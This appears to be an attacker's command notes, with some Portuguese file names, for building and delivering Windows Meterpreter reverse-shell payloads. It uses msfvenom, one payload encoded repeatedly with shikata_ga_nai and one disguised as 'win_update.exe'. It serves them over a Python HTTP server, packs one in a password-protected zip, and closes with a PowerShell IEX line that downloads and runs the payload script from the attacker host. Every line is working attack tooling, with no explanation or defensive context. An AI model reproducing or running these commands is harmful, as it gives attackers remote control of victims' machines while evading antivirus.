msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.105 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.105 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.105 LPORT=443 -f psh-cmd -o payload.ps1


python3 -m http.server 8080

http://192.168.1.105:8080/payload_protegido.zip



zip --password SuaSenhaForte payload_protegido.zip payload_encoded.exe

IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.105:8080/payload.ps1')



